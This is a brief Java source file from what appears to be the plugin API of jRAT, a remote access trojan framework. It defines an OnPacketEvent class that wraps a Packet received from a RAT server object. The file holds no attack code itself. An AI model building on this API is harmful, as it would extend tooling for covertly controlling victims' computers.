package pro.jrat.api.events;

import pro.jrat.api.Packet;
import pro.jrat.api.RATObject;

public class OnPacketEvent extends RATObjectEvent {

	private final Packet packet;

	public OnPacketEvent(RATObject server, Packet packet) {
		super(server);
		this.packet = packet;
	}

	public Packet getPacket() {
		return packet;
	}

}
